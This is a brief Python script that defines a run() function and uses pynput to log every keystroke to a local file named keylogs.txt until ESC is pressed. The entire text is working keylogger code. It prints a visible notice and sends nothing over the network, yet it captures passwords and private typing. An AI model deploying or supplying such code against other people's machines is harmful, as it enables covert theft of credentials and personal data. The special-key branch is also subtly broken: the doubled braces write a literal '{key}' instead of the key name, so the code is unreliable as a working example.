from pynput import keyboard

def run():
    log_file = "keylogs.txt"
    print(f"[+] Logging keystrokes to {log_file}... Press ESC to stop.")

    def on_press(key):
        try:
            with open(log_file, "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open(log_file, "a") as f:
                f.write(f"[{{key}}]")

    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()